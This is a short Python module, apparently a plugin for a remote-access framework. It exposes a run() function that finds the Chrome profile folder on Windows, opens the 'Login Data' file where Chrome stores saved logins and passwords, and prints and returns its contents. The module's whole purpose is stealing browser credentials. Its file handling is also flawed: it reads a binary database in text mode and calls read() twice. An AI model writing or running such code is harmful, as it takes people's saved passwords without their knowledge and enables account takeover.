import os

def run(**args):

	path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Default')

	if os.path.exists(path):

		with open(path + r'\Login Data', 'r') as f:

			print(f.read())

			return f.read()

	return ('None')
